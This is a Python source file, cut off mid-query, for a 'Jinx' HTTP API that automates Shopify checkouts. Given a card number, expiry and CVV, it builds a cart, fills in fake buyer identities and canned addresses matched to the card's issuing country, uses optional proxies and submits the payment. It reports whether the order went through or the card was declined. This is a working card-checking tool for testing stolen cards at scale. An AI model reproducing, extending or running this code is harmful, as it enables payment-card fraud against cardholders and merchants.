#!/usr/bin/env python3
"""
Jinx API — ShopifyK-Based Shopify Checker
==========================================
Based on ShopifyK.py (Terminal Edition) workflow:
  Proposal → Delivery → Submit → Poll

Endpoint: GET /Shopify?cc=<card>&site=<site>&proxy=<optional>&debug=1
Response: {"Response": "...", "Price": "...", "Gateway": "...", "Status": "...", "Debug": "..."}
"""

import os
import sys
import re
import json
import time
import random
import asyncio
import logging
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from concurrent.futures import ThreadPoolExecutor

try:
    import aiohttp
except ImportError:
    print("❌ pip install aiohttp")
    sys.exit(1)

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import socks  # noqa
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# ═══ CONFIG ═══
BRAND = "Jinx"
VERSION = "6.0.0"
HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("jinx")


# ═══ BIN → COUNTRY ═══
BOOK = {
    "US": {"address1": "123 Main St", "city": "NY", "postalCode": "10080",
           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586",
           "currency": "USD"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3",
           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198",
           "currency": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123",
           "currency": "GBP"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210",
           "currency": "INR"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567",
           "currency": "AED"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555",
           "currency": "HKD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430",
           "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345",
           "currency": "CHF"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567",
           "currency": "AUD"},
    "MX": {"address1": "Av. Reforma 222", "city": "CDMX", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "5555555555",
           "currency": "MXN"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080",
                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586",
                "currency": "USD"},
}

_bin_cache = {}
_bin_lock = __import__("threading").Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    if HAS_REQUESTS:
        try:
            r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
            if r.status_code == 200:
                d = r.json()
                c = (d.get("country_code") or d.get("country_alpha2") or "US").upper()
                with _bin_lock:
                    _bin_cache[bin6] = c
                return c
        except Exception:
            pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def addr_for(cc_number):
    cc = lookup_bin_country(cc_number[:6])
    return BOOK.get(cc, BOOK["DEFAULT"])


# ═══ PROXY PARSER ═══
def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══ ShopifyK.py UTILS ═══
def get_random_name():
    first = ["James", "John", "Robert", "Michael", "William", "David",
             "Mary", "Patricia", "Jennifer", "Linda"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
            "Miller", "Davis", "Rodriguez"]
    return random.choice(first), random.choice(last)


def generate_email(first, last):
    dom = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{first.lower()}.{last.lower()}@{random.choice(dom)}"


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0] or None
    except Exception:
        pass
    return None


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)', r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    return message[:50]


def is_captcha_required(text):
    if not text:
        return False
    ind = ['CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"',
           'captcha required', 'hcaptcha', 'h-captcha']
    t = text.upper()
    return any(i.upper() in t for i in ind)


# ═══ ShopifyK.py PROCESS_CARD (Async) ═══
async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"
                result = (await resp.json())['products']
                if not result:
                    return False, "No Products!"
        min_price = float('inf')
        min_product = None
        for product in result:
            if not product.get('variants'):
                continue
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)
                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return min_product
        return False, "No Valid Products"
    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"


async def make_graphql_request(session, graphql_url, params, headers, json_data):
    try:
        response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
        response_text = await response.text()
        return response, response_text
    except Exception as e:
        return None, str(e)


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, debug_log=None):
    """Full ShopifyK.py logic - Proposal → Delivery → Submit → Poll"""
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    def dbg(msg):
        if debug_log is not None:
            debug_log.append(msg)
        log.warning(f"[{cc[:6]}] {msg}")

    try:
        ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
        proxy = parse_proxy(proxy_str) if proxy_str else None

        # Pick address from BIN
        address_info = addr_for(cc)
        country_code = address_info["countryCode"]
        currency = address_info.get("currency", "USD")

        firstName, lastName = get_random_name()
        email = generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        # Fetch product
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            total_price = info['price']
            dbg(f"Picked variant {variant_id} at ${total_price}")

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            # ── 1. Add to cart ──
            cart_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1',
                                           headers=cart_headers, proxy=proxy)
            if cart_resp.status != 200:
                cart_headers_alt = {**cart_headers, 'Content-Type': 'application/json'}
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
            if cart_resp.status != 200:
                dbg(f"Cart failed {cart_resp.status}")
                return False, f"Cart failed {cart_resp.status}", gateway, total_price, currency
            dbg(f"Cart added")

            # ── 2. Init checkout ──
            checkout_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            response = await session.post(url=checkout, allow_redirects=True,
                                          headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)
            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or \
                  response.headers.get('x-checkout-one-session-token')
            text = await response.text()

            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')

            if 'login' in checkout_url.lower():
                dbg("Site requires login")
                return False, "Site requires login!", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or \
                         extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or \
                       extract_between(text, '"stableId":"', '"')
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)

            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            subtotal = extract_between(
                text,
                'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                '&quot;'
            ) or extract_between(
                text,
                '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"',
                '"'
            )
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            if not sst:
                dbg("No session token")
                return False, "Failed to get session token", gateway, total_price, currency
            dbg(f"Session token OK")

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': ourl,
                'Referer': ourl,
                'x-checkout-one-session-token': sst,
            }

            params = {'operationName': 'Proposal'}
            json_data = {
                'query': PROPOSAL_QUERY,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {'deliveryLines': [{
                        'destination': {'partialStreetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}},
                        'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True}}, 'options': {}},
                        'targetMerchandiseLines': {'any': True},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True}],
                        'noDeliveryRequired': [], 'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True},
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId or '1',
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None,
                            'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {'totalAmount': {'any': True}, 'paymentLines': [],
                        'billingAddress': {'streetAddress': {
                            'address1': '', 'city': '', 'countryCode': country_code,
                            'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False},
                    'tip': {'tipLines': []},
                    'taxes': {'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                        'shippingScriptChanges': []},
                    'optionalDuties': {'buyerRefusesDuties': False},
                },
                'operationName': 'Proposal',
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            response, resp_text = await make_graphql_request(
                session, graphql_url, params, headers, json_data
            )
            if not response:
                dbg(f"Request failed: {resp_text}")
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                dbg("CAPTCHA_REQUIRED")
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                dbg(f"Invalid JSON: {e}")
                return False, f"Invalid JSON response: {str(e)}", gateway, total_price, currency

            if 'errors' in resp_json:
                error_msgs = [e.get('message', str(e)) for e in resp_json['errors'][:3]]
                dbg(f"GraphQL Error: {error_msgs}")
                return False, f"GraphQL Error: {'; '.join(error_msgs)}", gateway, total_price, currency

            try:
                session_data = resp_json['data'].get('session')
                negotiate = session_data.get('negotiate')
                result = negotiate.get('result')
                result_type = result.get('__typename', 'Unknown')

                if result_type == 'CheckpointDenied':
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                if result_type == 'NegotiationResultFailed':
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get('checkpointData')
                seller_proposal = result.get('sellerProposal')
                delivery_data = seller_proposal.get('delivery')
                running_total = seller_proposal['runningTotal']['value']['amount']
            except (KeyError, TypeError) as e:
                dbg(f"Proposal parse error: {e}")
                return False, f"Failed to parse proposal: {str(e)}", gateway, total_price, currency

            if not delivery_data:
                return False, "No delivery data in proposal", gateway, total_price, currency

            delivery_type = delivery_data.get('__typename', '')
            if delivery_type == 'PendingTerms':
                delivery_strategy = ''
                shipping_amount = 0.0
            elif delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines and len(delivery_lines) > 0:
                    available_strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if available_strategies and len(available_strategies) > 0:
                        delivery_strategy = available_strategies[0].get('handle', '')
                        shipping_amount_data = available_strategies[0].get('amount', {}).get('value', {}).get('amount', '0')
                        try:
                            shipping_amount = float(shipping_amount_data)
                        except:
                            shipping_amount = 0.0
                    else:
                        delivery_strategy = ''
                        shipping_amount = 0.0
                else:
                    delivery_strategy = ''
                    shipping_amount = 0.0
            else:
                delivery_strategy = ''
                shipping_amount = 0.0

            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount_data = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0')
                    tax_amount = float(tax_amount_data)
                else:
                    tax_amount = 0.0
            except:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            payment_identifier = None
            displayName = ""
            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []):
                    payment_method = method.get('paymentMethod', {})
                    if payment_method.get('name') or payment_method.get('paymentMethodIdentifier'):
                        payment_identifier = payment_method.get('paymentMethodIdentifier')
                        displayName = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'Unknown')
                        gateway = payment_method.get('extensibilityDisplayName') or payment_method.get('name', 'UNKNOWN')
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                dbg("No payment method found")
                return False, "No valid payment method found", gateway, total_price, currency
            dbg(f"Payment method: {gateway}")

            # ── 3. Vault card ──
            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None,
                    "start_year": None, "issue_number": "",
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urlparse(url).netloc,
            }
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
            }

            token = None
            no_proxy_session = aiohttp.ClientSession()
            try:
                response = await no_proxy_session.post(
                    'https://checkout.pci.shopifyinc.com/sessions',
                    json=vault_payload, headers=vault_headers
                )
                try:
                    token_data = await response.json()
                    token = token_data.get('id')
                except Exception:
                    pass
            finally:
                await no_proxy_session.close()

            if not token:
                dbg("Vault failed")
                return False, "Unable to get payment token", gateway, total_price, currency
            dbg(f"Payment token OK")

            # ── 4. Submit ──
            params = {'operationName': 'SubmitForCompletion'}
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {'deliveryLines': [{
                        'destination': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}},
                        'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {
                            'handle': delivery_strategy if delivery_strategy else '',
                            'customDeliveryRate': False}, 'options': {'phone': phone}},
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'value': {
                            'amount': str(shipping_amount), 'currencyCode': currency}},
                        'destinationChanged': False}],
                        'noDeliveryRequired': [], 'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True},
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId or '1',
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None,
                            'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {'totalAmount': {'any': True},
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {
                            'paymentMethodIdentifier': payment_identifier,
                            'sessionId': token,
                            'billingAddress': {'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone}},
                            'cardSource': None}},
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None}],
                        'billingAddress': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False},
                    'taxes': {'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}},
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url},
            }
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            submit_json_data = {
                'query': SUBMIT_QUERY,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion',
            }

            response, text = await make_graphql_request(
                session, graphql_url, params, headers, submit_json_data
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "Your order total has changed" in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available" in text:
                return False, "Payment method not available", gateway, total_price, currency

            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    for error in errors:
                        code = error.get('code')
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get('__typename', '')

                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        if receipt.get('__typename') == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                elif result_type == 'SubmitFailed':
                    return False, extract_clean_response(submit_data.get('reason', 'Unknown reason')), gateway, total_price, currency
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    for error in errors:
                        code = error.get('code', '')
                        localized_msg = error.get('localizedMessage', '')
                        non_localized_msg = error.get('nonLocalizedMessage', '')
                        if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                            detail = localized_msg or non_localized_msg
                            if detail:
                                return False, detail, gateway, total_price, currency
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                elif result_type == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency

                receipt = submit_data.get('receipt', {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                rid = receipt.get('id')
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency
            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {str(e)}", gateway, total_price, currency

            # ── 5. Poll receipt ──
            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': POLL_QUERY,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt',
            }
            await asyncio.sleep(3)
            for i in range(4):
                response, final_text = await make_graphql_request(
                    session, graphql_url, params, headers, poll_json_data
                )
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        if receipt_data.get('__typename') in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            code = extract_between(final_text, '{"code":"', '"')
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        dbg(f"EXCEPTION: {type(e).__name__}: {str(e)[:80]}")
        return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency


# ═══ QUERIES (from ShopifyK.py) ═══
PROPOSAL_QUERY = (
    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
    "session(sessionInput:$sessionInput){negotiate(input:{"
    "purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,"
    "note:$note,nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,"
    "optionalDuties:$optionalDuties,captcha:$captcha},checkpointData:$checkpointData,"
    "queueToken:$queueToken}){__typename result{"
    "...on NegotiationResultAvailable{checkpointData queueToken "
    "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}"
    "subtotalBeforeTaxesAndShipping{value{amount currencyCode __typename}__typename}"
    "delivery{...on FilledDeliveryTerms{deliveryLines{id "
    "availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}"
    "payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "name paymentMethodIdentifier __typename}__typename}__typename}__typename}"
    "tax{...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}__typename}"
    "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}"
    "...on Throttled{pollAfter queueToken pollUrl __typename}"
    "...on NegotiationResultFailed{__typename}__typename}"
    "errors{code localizedMessage __typename}__typename}}}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
